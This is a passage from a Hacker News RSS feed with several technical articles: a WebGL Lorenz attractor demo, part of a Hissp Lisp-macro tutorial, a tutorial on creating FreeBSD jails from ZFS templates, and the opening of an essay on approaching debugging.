      <div data-reactroot="" data-reactid="1" data-react-checksum="154225102"><meta title="Lorenze Attractor" data-reactid="2"><p data-reactid="5"><!-- react-text: 6 -->The <!-- /react-text --><!-- react-text: 8 -->
is a set of chaotic solutions to the Lorenz system, defined by three coupled non-linear
equations:<!-- /react-text --></p><p>
\frac{\delta x}{\delta t} = a (y - x)</p><p>
\frac{\delta y}{\delta t} = x (b - z) - y</p><p>
\frac{\delta z}{\delta t} = xy - c z</p><p data-reactid="24"><!-- react-text: 25 -->On the right, you can see an implementation of the Lorenz attractor in WebGL using <!-- /react-text --><!-- react-text: 27 -->.<!-- /react-text --></p><p data-reactid="28"><!-- react-text: 29 -->Note that the equations above are dynamic. You can click on the constants <!-- /react-text --><code data-reactid="30"><!-- react-text: 31 -->a<!-- /react-text --></code><!-- react-text: 32 -->, <!-- /react-text --><code data-reactid="33"><!-- react-text: 34 -->b<!-- /react-text --></code><!-- react-text: 35 -->, or <!-- /react-text --><code data-reactid="36"><!-- react-text: 37 -->c<!-- /react-text --></code><!-- react-text: 38 --> and change their values to
radically change the appearance of the attractor.<!-- /react-text --></p><p data-reactid="39"><!-- react-text: 40 -->The code that I used to create this was modified from <!-- /react-text --><!-- react-text: 42 -->, which contains a
basic implementation in 140 bytes. I modified it to use a WebGL particle system, and dynamically respond to updates of the constants. I also
added in a <!-- /react-text --><a href="https://github.com/rreusser/regl-camera" data-reactid="43"><!-- react-text: 44 -->controllable camera<!-- /react-text --></a><!-- react-text: 45 -->, so that you can click and drag on the rendered output to change your viewpoint
(although the scrolling is a little wonky - sorry about that!).<!-- /react-text --></p><p data-reactid="46"><!-- react-text: 47 -->Here's the code I ended up with to make this Idyll component:<!-- /react-text --></p><p data-reactid="49"><!-- react-text: 50 -->Read more about Idyll at <!-- /react-text --><!-- react-text: 52 -->,
or <!-- /react-text --><!-- react-text: 54 -->.<!-- /react-text --></p></div>
    </div></div>]]>
            </description>
            <link>https://mathisonian.github.io/lorenz/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25813956</guid>
            <pubDate>Sun, 17 Jan 2021 19:23:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn to write Lisp macros in Python]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25813852">thread link</a>) | @gilch
<br/>
January 17, 2021 | https://hissp.readthedocs.io/en/v0.2.0/macro_tutorial.html | <a href="https://web.archive.org/web/*/https://hissp.readthedocs.io/en/v0.2.0/macro_tutorial.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Lisp is a higher-level language than Python,
in the same sense that Python is a higher-level language than C,
and C is a higher-level language than assembly.</p><p>In C, abstractions like for-loops and the function call stack are
<em>primitives</em>—features built into the language.
But in assembly, those are <em>design patterns</em> built with lower-level jumps/GOTOs
that have to be repeated each time they’re needed.
Things like call stacks had to be discovered and developed and learned as best practice
in the more primitive assembly languages.
Before the development of the structured programming paradigm,
the industry standard was GOTO spaghetti.</p><p>Similarly, in Python, abstractions like iterators, classes, higher-order functions,
and garbage collection are <em>primitives</em>,
but in C, those are <em>design patterns</em>,
discovered and developed over time as best practice,
and built with lower-level parts like structs and pointers,
which have to be repeated each time they’re needed.</p><p>To someone who started out in assembly or BASIC, or C, or even Java,
Python seems marvelously high-level, once mastered.
Python makes everything that was so tedious before <a href="https://xkcd.com/353/">seem <em>so easy</em>.</a></p><p>But the advanced Python developer eventually starts to notice the cracks.
You can get a lot further in Python, but like the old GOTO spaghetti code,
large enough projects start to collapse under their own weight.
Python seemed so easy before,
but certain repeated patterns can’t be abstracted away.
You’re stuck with a certain amount of boilerplate and ceremony.</p><p>Programmers comfortable with C,
but unfamiliar with Python,
will tend to write C idioms in Python,
like using explicit indexes into lists in for-loops over a <a href="https://docs.python.org/3/library/stdtypes.html#range" title="(in Python v3.9)"><code><span>range</span></code></a>,
instead of using the list’s iterator directly.
Their code is said to be <em>unpythonic</em>.
They forgo much of Python’s power,
because they don’t know the right idioms.</p><p>“Design patterns” and “idioms” in low-level languages
are language-level built-in features of higher-level ones.
Lisp is even higher-level than that.
In Lisp, you don’t have “design patterns” for long,
because they are a thing you can abstract to avoid repeating.
You can create your own <em>language-level</em> features,
because macros give you hooks into the compiler itself.</p><p>Lisp can do things you might not have realized were possible.
Until you understand what Lisp can do,
you’re forgoing much of Lisp’s power.
This is a tutorial,
not a reference,
and I’ll be explaining not just how to write macros,
but why you need them.</p><p>If you’re new to Lisp,
go back and read the <a href="https://hissp.readthedocs.io/en/v0.2.0/style_guide.html"><span>style guide</span></a> if you haven’t already.
Understanding how Lisp is <em>formatted</em> helps you to read it,
not just write it.
And you will need to read it.
Learning to read a new programming language can be difficult,
because you’re using up working memory that would otherwise
be helping with the meaning of the code on the syntax itself.
This does get better with familiarity,
because you can offload that part to your long-term memory.
That also means that it’s more difficult the more different the new language is
from those you already know.</p><p>Fortunately, Lissp’s syntax is very minimal,
so there’s not that much to remember,
and most of the vocabulary you know from Python already.
You can skim over the Python in this tutorial,
but resist the urge to skim the Lissp.
<a href="https://en.wikipedia.org/wiki/S-expression">S-expressions</a>
are a very direct representation of the same kind of syntax trees that
you mentally generate when reading any other programming language.
Take your time and comprehend each subexpression instead of taking it in all at once.</p><p>The previous tutorial was mostly about learning how to program with
a subset of Python in a new skin.
This one is about using that knowledge to reprogram the skin itself.</p><p>If you don’t know the basics from the <a href="https://hissp.readthedocs.io/en/v0.2.0/tutorial.html"><span>previous tutorial</span></a>,
go back and read that now, or at least read the <a href="https://hissp.readthedocs.io/en/v0.2.0/lissp_quickstart.html"><span>quick start</span></a>.</p><p>In the previous tutorial we mostly used the REPL,
but it can become tedious to type long forms into the REPL,
and it doesn’t save your work.
S-expressions are awkward to edit without editor support for them,
and the included Lissp REPL is layered on Python’s interactive console,
which has only basic line editing support.</p><p>The usual workflow when developing Lissp is to create a <code><span>.lissp</span></code>
file and work in there.
Then you can save as you go
and send fragments of it to the REPL for evaluation and experimentation.
You might already develop Python this way.
A good editor can be configured to send selected text to the REPL
with a simple keyboard command,
but copy-and-paste into a terminal window will do.</p><p>Setting up your editor for Lissp is beyond the scope of this tutorial.
If you’re not already comfortable with Emacs and Paredit,
give <a href="https://shaunlebron.github.io/parinfer/">Parinfer</a> a try.
It’s probably easiest to set up in <a href="https://atom.io/packages/parinfer">Atom</a>.</p><div id="shorter-lambdas">
<h2>Shorter Lambdas<a href="#shorter-lambdas" title="Permalink to this headline">¶</a></h2>
<p>The defect rate in computer programs seems to be a near-constant fraction
of the number of kilobytes of source code.
For reasonable line length,
it doesn’t seem to matter how much those lines are doing,
or what language it’s written in.
Code is a <em>liability</em>.
It’s that much more space for bugs to hide
— that much more you have to read to understand the system.
The less code you have, the better,
as long as it still gets the job done.</p>
<p>Perhaps this can be taken too far.
Code golf is good exercise, not good practice.
Eventually, there are diminishing returns,
and other costs to consider.
But as a rule of thumb,
one of the best things you can do to improve a codebase is to make it <em>shorter</em>,
almost any way you can.
Fewer slightly less-readable lines are much more readable
than too many slightly more-readable lines.</p>
<p>Consider Python’s humble <code><span>lambda</span></code>.
It’s important to programming in the functional style,
and central to the way Hissp works,
as a compilation target for one of its two special forms.
It’s actually really powerful.</p>
<p>But the overhead of typing out a six-letter word might make you a little too reluctant to use it,
unlike in Smalltalk where it’s just square brackets,
and it’s used all the time in control flow methods.</p>
<p>Wouldn’t it be nice if we could give <code><span>lambda</span></code> a shorter name?</p>

<p>Could we then use <code><span>L</span></code> in place of <code><span>lambda</span></code>?
Maybe like this?</p>
<div><div><pre><span></span><span>squares</span> <span>=</span> <span>map</span><span>(</span><span>L</span> <span>x</span><span>:</span> <span>x</span> <span>*</span> <span>x</span><span>,</span> <span>range</span><span>(</span><span>10</span><span>))</span>
</pre></div>
</div>
<p>Alas, this doesn’t work.
The <code><span>L</span> <span>=</span> <span>lambda</span></code> is a syntax error.</p>
<p>To be fair to Python, I’d use a generator expression here,
which is the same length:</p>
<div><div><pre><span></span><span>squares</span> <span>=</span> <span>map</span><span>(</span><span>L</span> <span>x</span><span>:</span> <span>x</span> <span>*</span> <span>x</span><span>,</span> <span>range</span><span>(</span><span>10</span><span>))</span>
<span>squares</span> <span>=</span> <span>(</span><span>x</span> <span>*</span> <span>x</span> <span>for</span> <span>x</span> <span>in</span> <span>range</span><span>(</span><span>10</span><span>))</span>
</pre></div>
</div>
<p>But I need a simple example,
and lambdas are a lot more general:</p>
<div><div><pre><span></span><span>product</span> <span>=</span> <span>reduce</span><span>(</span><span>L</span> <span>a</span><span>,</span> <span>x</span><span>:</span> <span>a</span> <span>*</span> <span>x</span><span>,</span> <span>range</span><span>(</span><span>1</span><span>,</span> <span>7</span><span>))</span>
</pre></div>
</div>
<p>A genexpr doesn’t really help us in a <a href="https://docs.python.org/3/library/functools.html#functools.reduce" title="(in Python v3.9)"><code><span>reduce</span></code></a>.</p>
<p>They say that in Python everything is an object.
But it’s not quite true, is it?
<code><span>lambda</span></code> isn’t an object in Python.
It’s a reserved word, but at runtime, that’s not an object.
It’s not anything.
If you’re rolling your eyes and thinking,
“Why would I even expect this to work?”
then you’re still thinking inside the Python box.</p>
<p>You can store class and function objects in variables
and pass them as arguments to functions in Python.
To someone who came from a language without higher-order functions,
this feels like breaking the rules.
Using it effectively feels like amazing out-of-the-box thinking.</p>
<p>Let’s begin.</p>
<div id="warm-up">
<h3>Warm-Up<a href="#warm-up" title="Permalink to this headline">¶</a></h3>
<p>Create a Lissp file (perhaps <code><span>macros.lissp</span></code>),
and open it in your Lisp editor of choice.</p>
<p>Fire up the Lissp REPL in a terminal,
or in your editor if it does that.</p>
<p>Add the prelude to the top of the file:</p>
<div><div><pre><span></span><span>(</span><span>hissp.basic.._macro_.prelude</span><span>)</span>
</pre></div>
</div>
<p>And push it to the REPL as well:</p>
<div><div><pre><span></span><span>#&gt;</span> <span>(</span><span>hissp.basic.._macro_.prelude</span><span>)</span>
<span>&gt;&gt;&gt; </span><span># hissp.basic.._macro_.prelude</span>
<span>... </span><span>__import__</span><span>(</span><span>'builtins'</span><span>)</span><span>.</span><span>exec</span><span>(</span>
<span>... </span>  <span>(</span><span>'from operator import *</span><span>\n</span><span>'</span>
<span>... </span>   <span>'from itertools import *</span><span>\n</span><span>'</span>
<span>... </span>   <span>'try:</span><span>\n</span><span>'</span>
<span>... </span>   <span>'    from hissp.basic import _macro_</span><span>\n</span><span>'</span>
<span>... </span>   <span>"    _macro_ = __import__('types').SimpleNamespace(**vars(_macro_))</span><span>\n</span><span>"</span>
<span>... </span>   <span>'except ModuleNotFoundError:</span><span>\n</span><span>'</span>
<span>... </span>   <span>'    pass'</span><span>))</span>
</pre></div>
</div>
<div>
<p>Caution</p>
<p>The <a href="https://hissp.readthedocs.io/en/v0.2.0/hissp.basic.html#hissp.basic._macro_.prelude" title="hissp.basic._macro_.prelude"><code><span>prelude</span></code></a> macro overwrites your <code><span>_macro_</span></code> namespace with a copy of the basic one.
Any macros you’ve defined in there are lost.
In Lissp files, the prelude is meant to be used before any definitions,
when it is used at all.
Likewise, in the REPL, enter it first, or be prepared to re-enter your definitions.
The REPL already comes with the <a href="https://hissp.readthedocs.io/en/v0.2.0/hissp.basic.html#module-hissp.basic" title="hissp.basic"><code><span>basic</span></code></a> macros,
but not the <a href="https://docs.python.org/3/library/itertools.html#module-itertools" title="(in Python v3.9)"><code><span>itertools</span></code></a> or <a href="https://docs.python.org/3/library/operator.html#module-operator" title="(in Python v3.9)"><code><span>operator</span></code></a>s.</p>
</div>
<p>I’ll mostly be showing the REPL from here on.
Remember, compose in your Lissp file,
then push to the REPL.
We’ll be modifying these definitions through several iterations.</p>
<p>Let’s try the same idea in Lissp:</p>
<div><div><pre><span></span><span>#&gt;</span> <span>(</span><span>define</span> <span>L</span> <span>lambda</span><span>)</span>
<span>&gt;&gt;&gt; </span><span># define</span>
<span>... </span><span>__import__</span><span>(</span><span>'operator'</span><span>)</span><span>.</span><span>setitem</span><span>(</span>
<span>... </span>  <span>__import__</span><span>(</span><span>'builtins'</span><span>)</span><span>.</span><span>globals</span><span>(),</span>
<span>... </span>  <span>'L'</span><span>,</span>
<span>... </span>  <span>lambda</span><span>)</span>
Traceback (most recent call last):
  ...
  File "&lt;console&gt;", line 5
    lambda)
          ^
SyntaxError: invalid syntax
</pre></div>
</div>
<p>Still a syntax error.
The problem is that we tried to evaluate the <code><span>lambda</span></code> before the assignment.
You can use Hissp’s other special form, <code><span>quote</span></code>, to prevent evaluation.</p>
<div><div><pre><span></span><span>#&gt;</span> <span>(</span><span>define</span> <span>L</span> <span>'</span><span>lambda</span><span>)</span>
<span>&gt;&gt;&gt; </span><span># define</span>
<span>... </span><span>__import__</span><span>(</span><span>'operator'</span><span>)</span><span>.</span><span>setitem</span><span>(</span>
<span>... </span>  <span>__import__</span><span>(</span><span>'builtins'</span><span>)</span><span>.</span><span>globals</span><span>(),</span>
<span>... </span>  <span>'L'</span><span>,</span>
<span>... </span>  <span>'lambda'</span><span>)</span>
</pre></div>
</div>
<p>OK, but that just turned it into a string.
We could have done that much in Python:</p>

<p>That worked, but can we use it?</p>
<div><div><pre><span></span><span>&gt;&gt;&gt;</span> <span>squares</span> <span>=</span> <span>map</span><span>(</span><span>L</span> <span>x</span><span>:</span> <span>x</span> <span>*</span> <span>x</span><span>,</span> <span>range</span><span>(</span><span>10</span><span>))</span>
<span>Traceback</span> <span>(</span><span>most</span> <span>recent</span> <span>call</span> <span>last</span><span>):</span>
  <span>...</span>
  <span>squares</span> <span>=</span> <span>map</span><span>(</span><span>L</span> <span>x</span><span>:</span> <span>x</span> <span>*</span> <span>x</span><span>,</span> <span>range</span><span>(</span><span>10</span><span>))</span>
                 <span>^</span>
<span>SyntaxError</span><span>:</span> <span>invalid</span> <span>syntax</span>
</pre></div>
</div>
<p>Another syntax error.
No surprise.</p>
<p>Write the equivalent example in your Lissp file
and push it to the REPL:</p>
<div><div><pre><span></span><span>#&gt;</span> <span>(</span><span>define</span> <span>squares</span> <span>(</span><span>map</span> <span>(</span><span>L</span> <span>(</span><span>x</span><span>)</span>
<span>#..</span>                       <span>(</span><span>mul</span> <span>x</span> <span>x</span><span>))</span>
<span>#..</span>                     <span>(</span><span>range</span> <span>10</span><span>)))</span>
<span>&gt;&gt;&gt; </span><span># define</span>
<span>... </span><span>__import__</span><span>(</span><span>'operator'</span><span>)</span><span>.</span><span>setitem</span><span>(</span>
<span>... </span>  <span>__import__</span><span>(</span><span>'builtins'</span><span>)</span><span>.</span><span>globals</span><span>(),</span>
<span>... </span>  <span>'squares'</span><span>,</span>
<span>... </span>  <span>map</span><span>(</span>
<span>... </span>    <span>L</span><span>(</span>
<span>... </span>      <span>x</span><span>(),</span>
<span>... </span>      <span>mul</span><span>(</span>
<span>... </span>        <span>x</span><span>,</span>
<span>... </span>        <span>x</span><span>)),</span>
<span>... </span>    <span>range</span><span>(</span>
<span>... </span>      <span>(</span><span>10</span><span>))))</span>
Traceback (most recent call last):
  File "&lt;console&gt;", line 7, in &lt;module&gt;
NameError: name 'x' is not defined
</pre></div>
</div>
<p>Not a syntax error, but it’s not working either.
Why not?
Quote the whole thing to see the Hissp tuples.</p>
<div><div><pre><span></span><span>#&gt;</span> <span>'</span><span>(</span><span>define</span> <span>squares</span> <span>(</span><span>map</span> <span>(</span><span>L</span> <span>(</span><span>x</span><span>)</span>
<span>#..</span>                        <span>(</span><span>mul</span> <span>x</span> <span>x</span><span>))</span>
<span>#..</span>                      <span>(</span><span>range</span> <span>10</span><span>)))</span>
<span>&gt;&gt;&gt; </span><span>(</span><span>'define'</span><span>,</span> <span>'squares'</span><span>,</span> <span>(</span><span>'map'</span><span>,</span> <span>(</span><span>'L'</span><span>,</span> <span>(</span><span>'x'</span><span>,),</span> <span>(</span><span>'mul'</span><span>,</span> <span>'x'</span><span>,</span> <span>'x'</span><span>)),</span> …</pre></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hissp.readthedocs.io/en/v0.2.0/macro_tutorial.html">https://hissp.readthedocs.io/en/v0.2.0/macro_tutorial.html</a></em></p>]]>
            </description>
            <link>https://hissp.readthedocs.io/en/v0.2.0/macro_tutorial.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25813852</guid>
            <pubDate>Sun, 17 Jan 2021 19:13:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Creating Comfy FreeBSD Jails Using Standard Tools]]>
            </title>
            <description>
<![CDATA[
Score 112 | Comments 22 (<a href="https://news.ycombinator.com/item?id=25813800">thread link</a>) | @kettunen
<br/>
January 17, 2021 | https://kettunen.io/post/standard-freebsd-jails/ | <a href="https://web.archive.org/web/*/https://kettunen.io/post/standard-freebsd-jails/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
		<div>
			<div>
			
<main role="main">
	<article>
		<div>
			<p><a href="https://www.docker.com/">Docker</a> has stormed into software development in
recent years. While the concepts behind it are powerful and useful, similar
tools have been used in systems for decades. FreeBSD’s
<a href="https://www.freebsd.org/doc/handbook/jails.html">jails</a> in one of those tools
which build upon even older <code>chroot(2)</code> To put it shortly, with these tools, you
can make a safe environment separated from the rest of the system.</p>
<p>Jails in FreeBSD is by no means a new tool (introduced in 4.X), but for a reason
or another, I haven’t used them that often, which is a shame since they are so
powerful. So I wanted to explore this concept in a concise and summarized
manner.</p>
<h2 id="templates">Templates</h2>
<p>ZFS datasets are a great way of creating templates for jails since, after the
template creation, you can easily create new jails with <code>zfs clone</code> or <code>zfs send/receive</code>. Typically people tend to divide jails to complete and service
jails, where the former usually resembles a real FreeBSD system, and the latter
is often dedicated to applications/services. I’ll cover complete jails for now.</p>
<p>The creation of templates starts with creating a dataset for your jail and
template. Here I’ll make a new dataset for the base installation of FreeBSD
12.2.</p>
<pre><code>$ sudo zfs create -o mountpoint=/vm zroot/vm
$ sudo zfs create zroot/vm/tmpl
$ sudo zfs create zroot/vm/tmpl/12.2
</code></pre><p>After that, fetch the base installation itself:</p>
<pre><code>$ fetch ftp://ftp.freebsd.org/pub/FreeBSD/releases/amd64/12.2-RELEASE/base.txz
# Fetch all the necessary stuff for your template, e.g. lib32 if needed
$ sudo tar -xJvpf base.txz -C /vm/tmpl/12.2
</code></pre><p>After that you should write a minimum viable <code>/etc/rc.conf</code> for the template:</p>
<pre><code>$ sudo emacs /vm/tmpl/12.2/etc/rc.conf
</code></pre><blockquote>
<p><strong>Note</strong>: Refer to <code>rc.conf(5)</code>.</p>
</blockquote>
<pre><code># Start or stop services
sendmail_enable="NO"
sendmail_submit_enable="NO"
sendmail_outbound_enable="NO"
sendmail_msp_queue_enable="NO"
syslogd_flags="-ss"
cron_flags="-J 60"
</code></pre><p>You can also disable some unnecessary jobs for jails:</p>
<pre><code>$ sudo emacs /vm/tmpl/12.2/etc/periodic.conf
</code></pre><blockquote>
<p><strong>Note</strong>: Refer to <code>periodic.conf(5)</code>.</p>
</blockquote>
<pre><code># No output for successful script runs.
daily_show_success="NO"
weekly_show_success="NO"
monthly_show_success="NO"
security_show_success="NO"
   
# Output to log files which are rotated by default.
daily_output="/var/log/daily.log"
daily_status_security_output="/var/log/daily.log"
weekly_output="/var/log/weekly.log"
weekly_status_security_output="/var/log/weekly.log"
monthly_output="/var/log/monthly.log"
monthly_status_security_output="/var/log/monthly.log"
   
# No need for those without sendmail
daily_clean_hoststat_enable="NO"
daily_status_mail_rejects_enable="NO"
daily_status_mailq_enable="NO"
daily_queuerun_enable="NO"
   
# Host does those
daily_status_disks_enable="NO"
daily_status_zfs_zpool_list_enable="NO"
daily_status_network_enable="NO"
daily_status_uptime_enable="NO"
daily_ntpd_leapfile_enable="NO"
weekly_locate_enable="NO"
weekly_whatis_enable="NO"
security_status_chksetuid_enable="NO"
security_status_neggrpperm_enable="NO"
security_status_chkuid0_enable="NO"
security_status_ipfwdenied_enable="NO"
security_status_ipfdenied_enable="NO"
security_status_ipfwlimit_enable="NO"
security_status_ipf6denied_enable="NO"
security_status_tcpwrap_enable="NO"
</code></pre><p>You also might want to enable ports in your jail:</p>
<pre><code>$ sudo mkdir /vm/tmpl/12.2/usr/ports
$ sudo mkdir -p /vm/tmpl/12.2/var/ports/{distfiles,packages}
$ sudo emacs /vm/tmpl/12.2/etc/make.conf
</code></pre><pre><code>WRKDIRPREFIX = /var/ports
DISTDIR = /var/ports/distfiles
PACKAGES = /var/ports/packages
</code></pre><p>Apply system updates to the template:</p>
<pre><code>$ sudo freebsd-update -b /vm/tmpl/12.2 fetch install
</code></pre><p>Lastly, take a snapshot:</p>
<pre><code>$ sudo zfs snapshot zroot/vm/tmpl/12.2@complete
</code></pre><p>This creates a snapshot of <code>zroot/vm/tmpl/12.2</code> named <code>complete</code>. You can then check your current snapshots with:</p>
<pre><code>$ sudo zfs list -t snapshot
</code></pre><h2 id="creating-jails-from-the-template">Creating Jails from the Template</h2>
<p>Now you should be able to create a new jail based on that snapshot. You can do
it either with <code>zfs clone</code> or <code>zfs send/receive</code>:</p>
<blockquote>
<p><strong>Difference Between the Two</strong></p>
</blockquote>
<blockquote>
<p>“A clone is a writable volume or file system whose initial contents are the
same as the dataset from which it was created. As with snapshots, creating a
clone is nearly instantaneous and initially consumes no additional disk
space. In addition, you can snapshot a clone.” [1]</p>
</blockquote>
<blockquote>
<p>“The zfs send command creates a stream representation of a snapshot that is
written to standard output. By default, a full stream is generated. You can
redirect the output to a file or to a different system. The zfs receive
command creates a snapshot whose contents are specified in the stream that is
provided on standard input. If a full stream is received, a new file system is
created as well. You can send ZFS snapshot data and receive ZFS snapshot data
and file systems with these commands. See the examples in the next section.”
[2]</p>
</blockquote>
<pre><code>$ sudo zfs clone zroot/vm/tmpl/12.2@complete zroot/vm/jail1

# OR

$ sudo sh -c "zfs send zroot/vm/tmpl/12.2@complete | zfs receive zroot/vm/jail1"
</code></pre><h2 id="jail-configurations">Jail Configurations</h2>
<blockquote>
<p><strong>Note</strong>: These configurations is for very bare-bones jail, e.g. without any
mounts or advanced networking. Further configurations are discussed in future posts.</p>
</blockquote>
<pre><code># /etc/rc.conf

cloned_interfaces="lo0"

# PF is used for NAT and port forwarding.
pf_enable="YES"
pflog_enable="YES"

jail_enable="YES"
jail_list="jail1"
</code></pre><blockquote>
<p><strong>Note</strong>: Refer to <code>jail.conf(5)</code>.</p>
</blockquote>
<pre><code># /etc/jail.conf

exec.start = "/bin/sh /etc/rc";
exec.stop = "/bin/sh /etc/rc.shutdown";
exec.clean;
mount.devfs;

host.hostname = $name;
path = "/vm/$name";
exec.consolelog = "/var/log/jail_${name}_console.log";
exec.prestart = "cp /etc/resolv.conf $path/etc";
exec.poststop = "rm $path/etc/resolv.conf";

jail1 {
        ip4.addr = "lo0|127.1.1.1/32";
        ip6.addr = "lo0|fd00:1:1:1::1/64";
        allow.chflags;
        allow.raw_sockets;
}
</code></pre><pre><code># /etc/hosts

...

127.1.1.1 jail1
fd00:1:1:1::1 jail1
</code></pre><h2 id="jail-management">Jail Management</h2>
<p>Start/stop all jails.</p>
<pre><code>$ sudo service jail start
</code></pre><p>Start/stop a specific jail(s).</p>
<pre><code>$ sudo service jail start jail1
</code></pre><p>Log in to jail.</p>
<pre><code>$ sudo jexec jail1
</code></pre><p>Exec a command on a jail.</p>
<pre><code>$ sudo jexec jail1 uname -a
FreeBSD jail1 12.2-RELEASE FreeBSD 12.2-RELEASE r366954 GENERIC  amd64
</code></pre><p>List running jails.</p>
<pre><code>$ jls
   JID  IP Address      Hostname                      Path
     3  127.1.1.1       jail1                         /vm/jail1
</code></pre><p>So that’s how you can spin up a simple restricted environment on your FreeBSD
system. There are still lots of things to cover in this topic, e.g., in-depth
networking and configurations. But I think those deserve their own posts. So see
you soon!</p>
<h2 id="notes">Notes</h2>
<p>[1] Overview of ZFS Clones: <a href="https://docs.oracle.com/cd/E19253-01/819-5461/gbcxz/index.html">https://docs.oracle.com/cd/E19253-01/819-5461/gbcxz/index.html</a></p>
<p>[2] Sending and Receiving ZFS Data: <a href="https://docs.oracle.com/cd/E18752_01/html/819-5461/gbchx.html">https://docs.oracle.com/cd/E18752_01/html/819-5461/gbchx.html</a></p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.freebsd.org/doc/handbook/jails.html">FreeBSD Jails</a></li>
</ul>

		</div>
		
	</article>
</main>







			</div>
			
		</div>
		

	</div></div>]]>
            </description>
            <link>https://kettunen.io/post/standard-freebsd-jails/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25813800</guid>
            <pubDate>Sun, 17 Jan 2021 19:07:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Approaching Debugging]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25813410">thread link</a>) | @cynik_
<br/>
January 17, 2021 | https://explog.in/notes/debugging.html | <a href="https://web.archive.org/web/*/https://explog.in/notes/debugging.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

<p>
This is my approach to debugging. <a href="https://jvns.ca/blog/2019/06/23/a-few-debugging-resources/">There</a> <a href="https://www.amazon.com/dp/B00PDDKQV2/ref=dp-kindle-redirect?_encoding=UTF8&amp;btkr=1">are</a> <a href="https://blog.regehr.org/archives/199">many</a> like it, but this one
is mine<sup><a id="fnr.1" href="#fn.1">1</a></sup>. 
</p>


<div id="org318ac55">
<p><img src="https://explog.in/static/images/debugging.png" alt="debugging.png">
</p>
<p><span>Figure 1: </span>Spoiler</p>
</div>

<div id="outline-container-org6b6021c">
<h2 id="org6b6021c">Approaching debugging</h2>

<div id="outline-container-org36e0079">
<h3 id="org36e0079">Breathe</h3>
<div id="text-org36e0079">
<p>
The first and most important aspect of tackling a thorny problem is to
have the right <b>mindset</b>.
</p>

<p>
I like to approach bugs calmly, with curiosity, and (possibly
undue) optimism. Frustration, panic, and pessimism induce tunnel
vision and make the problem much harder to fix.
</p>

<p>
<i>It's just code</i>. You can fix it.
</p>
</div>
</div>

<div id="outline-container-org4678609">
<h3 id="org4678609">Establish boundaries</h3>
<div id="text-org4678609">
<p>
Understanding the problem is obviously important, but there's a
cost/benefit analysis to do first: how <i>important</i> is it; deciding
how much time and how many engineers you're willing to <i>spend</i> to fix
it. 
</p>

<p>
Is there a threshold at which it would be better to patch over the
problem instead? Or to leave it unfixed <sup><a id="fnr.2" href="#fn.2">2</a></sup>?
</p>
</div>
</div>

<div id="outline-container-org0e37074">
<h3 id="org0e37074">Write everything down</h3>
<div id="text-org0e37074">
<p>
Debugging often involves switching between extremely involved
depth-first and wide breadth-first searches while diagnosing the
issue: writing things down acts as an additional form of memory,
and helps quickly bring additional people up to speed. 
</p>

<p>
Most importantly, it can also help highlight what <i>hasn't</i> been tried yet.
</p>

<p>
Written notes also come in handly <i>after</i> the problem has been
solved: for retrospectives, spreading knowledge, and building a
collection of war stories.
</p>
</div>
</div>

<div id="outline-container-orgdb864fe">
<h3 id="orgdb864fe">Define the problem</h3>
<div id="text-orgdb864fe">
<p>
Make sure you clearly understand and can describe the issue:
what's the <i>actual</i> behavior and what's the <i>expected</i> behavior? 
</p>

<p>
Often enough I find something I <i>considered</i> a bug the result
of complex systems interacting in unexpected but <i>intended</i> ways.
</p>
</div>
</div>

<div id="outline-container-orgd854200">
<h3 id="orgd854200">Mitigate</h3>
<div id="text-orgd854200">
<p>
All through the process, you must constantly evaluate if / when you
need to mitigate the problem, even if you don't quite know the <i>right</i>
solution yet.
</p>

<p>
A common solution is to revert to a known-good state; patch around the
problem, or disable a specific feature while the behavior is fixed.
</p>

<p>
You should consider your confidence in the mitigation, the ease and
speed of deployment, the urgency of the problem and the likelihood of
finding a "better" fix while making this decision.
</p>
</div>
</div>

<div id="outline-container-orge29a507">
<h3 id="orge29a507">Find clues</h3>
<div id="text-orge29a507">
<p>
Bugs can have several distinctive characteristics: quickly identifying
these can speed up debugging significantly.
</p>

<p>
Some common tactics to apply:
</p>
<ul>
<li>Are there any hints in logs or telemetry?</li>
<li>Where does it happen: specific devices, only in production, only in
the development environment, everywhere?</li>
<li>Who does it occur for? Are there any specific characteristics for
affected users / identifying unit for the bug? Instrumentation can
be very valuable here.</li>
<li>Does it reproduce consistently? Is it (<i>shudder</i>) a race condition?</li>
<li>When did it start happening? What changed around that time?</li>
<li>Visualize any available data to look for patterns.</li>
</ul>

<p>
Ideally you have enough instrumentation, telemetry and samples to be
able to answer these questions quickly. Alternatively, collecting a
small set of examples can significantly reduce the search space. 
</p>
</div>
</div>

<div id="outline-container-org4c04abc">
<h3 id="org4c04abc">Experiment</h3>
<div id="text-org4c04abc">
<p>
Based on the clues you've carefully written down, you might have <i>some</i>
intuition of <i>where</i> the problem is potentially happening: this step
relies on your understanding of the system.
</p>

<p>
Another way to build this intuition is to look for the first point
at which reality diverges from your mental model of the system:
understand why.
</p>

<p>
<b>Make a hypothesis first</b>, predict what will happen, and go and apply
the change. <b>Change one thing at a time</b> to make sure you can reason
clearly around cause and effect.
</p>

<p>
Figure out how to test changes <b>cheaply</b> and have a tight feedback
loop. Consistently look for reasons to <b>disprove</b> your hypothesis.
</p>

<p>
There will be times when it'll be multiple tiny bugs coming together
in wonderfully imaginative ways, and you'll need to apply multiple
fixes. Remember to maintain a record of everything that's been tried!
</p>
</div>
</div>

<div id="outline-container-orge1ca8a6">
<h3 id="orge1ca8a6">Think laterally</h3>
<div id="text-orge1ca8a6">
<p>
Sometimes, things just don't fit together, or there's just no time to play
"scientist" and experiment. You can always try to brute force the
solution by treating the system like a black box and looking at it
from the outside instead.
</p>

<p>
By looking at when the problem started happening, you can understand
<i>what changed</i>. Look through the commit history; look at the changes in the
